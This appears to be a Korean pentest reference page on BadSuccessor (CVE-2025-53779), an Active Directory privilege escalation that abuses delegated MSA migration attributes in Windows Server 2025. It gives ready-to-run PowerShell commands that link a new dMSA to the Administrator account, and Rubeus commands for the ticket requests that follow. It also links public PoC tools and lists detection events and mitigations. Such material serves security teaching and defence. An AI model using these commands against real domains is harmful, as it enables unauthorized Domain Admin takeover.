# BadSuccessor: 위임된 MSA 마이그레이션 악용을 통한 권한 상승

{{#include ../../banners/hacktricks-training.md}}

## 개요

위임된 Managed Service Account(**dMSA**)는 Windows Server 2025에 포함된 차세대 **gMSA**입니다. 정식 마이그레이션 워크플로를 사용하면 관리자가 *기존* 계정(사용자, 컴퓨터 또는 서비스 계정)을 dMSA로 교체하면서 권한을 투명하게 유지할 수 있습니다. 이 워크플로는 `Start-ADServiceAccountMigration` 및 `Complete-ADServiceAccountMigration` 같은 PowerShell cmdlet을 통해 제공되며, **dMSA 객체**의 두 LDAP 속성을 사용합니다.

* **`msDS-ManagedAccountPrecededByLink`** – 대체된(기존) 계정에 대한 *DN 링크*.
* **`msDS-DelegatedMSAState`**       – 마이그레이션 상태(`0` = 없음, `1` = 진행 중, `2` = *완료*).<sup>[[1]](#references)</sup>

공격자가 OU 내에 **임의의** dMSA를 생성하고 이 두 속성을 직접 조작할 수 있다면, LSASS와 KDC는 dMSA를 연결된 계정의 *후속 계정*으로 취급합니다. 이후 공격자가 dMSA로 인증하면 **연결된 계정의 모든 권한을 상속하며**, 연결된 계정이 Administrator인 경우 **Domain Admin** 권한까지 얻을 수 있습니다.<sup>[[1]](#references)</sup>

이 기법은 Unit 42가 2025년에 **BadSuccessor**라고 명명했습니다. 이후 Microsoft는 이 기법에 **CVE-2025-53779**를 부여하고 2025년 **8월**에 보안 업데이트를 배포했습니다. 이 기법은 패치되지 않은 Windows Server 2025 환경과 위험한 OU 위임 검토에 여전히 관련이 있습니다.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

패치된 DC에서도 공격자가 대상 계정의 마이그레이션 속성을 쓸 수 있다면 [양방향 dMSA 마이그레이션](acl-persistence-abuse/BadSuccessor.md#bettersuccessor-after-the-kdc-patch)을 통해 대상 계정이 노출될 수 있습니다. 이는 원래의 임의 대상 공격보다 범위가 좁습니다.

### 공격 전제 조건

1. **조직 구성 단위(OU)** 내에서 객체를 생성할 *수 있고*, 다음 중 하나 이상의 권한이 있는 계정:
   * `Create Child` → **`msDS-DelegatedManagedServiceAccount`** 객체 클래스
   * `Create Child` → **`All Objects`** (일반 생성 권한)
2. LDAP 및 Kerberos에 대한 네트워크 연결(일반적인 도메인 가입 시나리오 / 원격 공격).<sup>[[1]](#references)</sup>

## 취약한 OU 열거

Unit 42는 각 OU의 보안 설명자를 분석하고 필요한 ACE를 표시하는 PowerShell 도우미 스크립트를 공개했습니다.<sup>[[1]](#references)</sup>

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

스크립트는 내부적으로 `(objectClass=organizationalUnit)`에 대해 paged LDAP search를 실행하고 각 `nTSecurityDescriptor`에서 다음 항목을 확인합니다.

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)

## Exploitation Steps

쓰기 가능한 OU를 식별하면 공격은 LDAP 쓰기 3회만으로 가능합니다:<sup>[[1]](#references)</sup>

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

복제가 완료되면 공격자는 `attacker_dMSA$`로 **logon**하거나 Kerberos TGT를 요청하기만 하면 됩니다. Windows는 *대체된* 계정의 토큰을 생성합니다.<sup>[[1]](#references)</sup>

### 자동화

여러 공개 PoC는 암호 검색 및 티켓 관리까지 전체 워크플로를 처리합니다.

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec 모듈 – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## 탐지 및 헌팅

OU에서 **Object Auditing**을 활성화하고 다음 Windows 보안 이벤트를 모니터링하세요:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – **dMSA** 개체 생성
* **5136** – **`msDS-ManagedAccountPrecededByLink`** 수정
* **4662** – 특정 특성 변경
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – dMSA에 대한 TGT 발급

`4662`(특성 수정), `4741`(컴퓨터/서비스 계정 생성), `4624`(후속 로그온)를 연관 지어 분석하면 BadSuccessor 활동을 신속히 식별할 수 있습니다. **XSIAM** 같은 XDR 솔루션에는 바로 사용할 수 있는 쿼리가 포함되어 있습니다(참조 항목 참고).<sup>[[2]](#references)</sup>

## 완화

* **CVE-2025-53779**에 대한 Microsoft 보안 업데이트를 적용하고 모든 Windows Server 2025 도메인 컨트롤러의 패치 수준을 확인하세요.<sup>[[6]](#references)</sup>
* **최소 권한** 원칙을 적용하세요. *Service Account* 관리는 신뢰할 수 있는 역할에만 위임하세요.
* 명시적으로 필요한 OU가 아니라면 `Create Child` / `msDS-DelegatedManagedServiceAccount` 권한을 제거하세요.
* 위에 나열된 이벤트 ID를 모니터링하고, *Tier-0이 아닌* ID가 dMSA를 생성하거나 수정하면 경고를 발생시키세요.

## 참고 항목


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Active Directory에서 권한 상승을 위해 dMSA 악용 – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – 정상 계정이 악용될 때: 위임된 관리 서비스 계정 악용](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor 모듈](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft 보안 대응 센터 – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
